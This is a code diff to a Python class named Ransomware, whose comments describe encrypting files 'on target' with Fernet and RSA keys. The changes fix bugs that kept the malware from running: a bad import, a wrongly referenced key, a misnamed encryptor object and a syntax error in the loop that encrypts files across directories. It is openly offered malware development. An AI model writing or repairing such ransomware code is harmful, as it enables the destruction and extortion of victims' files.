@@ -3,11 +3,11 @@ from cryptography.fernet import Fernet # Encrypt/Decrypt files on target
 import os # Get System root
 import webbrowser # Load User's Browser
 import ctypes # Call DLLs or Shared libaraies
-import request # Fetch Images From Websites
 import subprocess # to open up notepad 
 import threading # For Multi threading
 import platform # Checking Platform
-import urllib.requets
+import urllib.request
+import requests
 from time import sleep
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -41,7 +41,7 @@ class Ransomware:
 
 		#Generate Fernet Key and Create Fernet Object
 		self.key = Fernet.generate_key() # Generate Symmetric Fernet Key To Encrypt/Decrypt Files
-		self.crypter = Fernet(key) # Create Fernet Object
+		self.crypter = Fernet(self.key) # Create Fernet Object
 
 	def write_key(self):
 
@@ -76,12 +76,12 @@ class Ransomware:
 
 			# Encrypt Data
 			if not encrypted :
-				_data=self.cryptor.encrypt(data)
+				_data=self.crypter.encrypt(data)
 				#print(f"{file_path} Has Been Encrypted ")
 
 			# Decrypt Data
 			else :
-				_data=self.cryptor.decrypt(data)
+				_data=self.crypter.decrypt(data)
 				#print(f"{file_path} Has Been Decrypted ")
 
 		with open(file_path,'wb') as fp :
@@ -98,7 +98,7 @@ class Ransomware:
 					continue
 				if not encrypted:
 					self.crypt_file(file_path)
-				else 
+				else :
 					self.crypt_file(file_path,encrypted=True)
 
 	@staticmethod
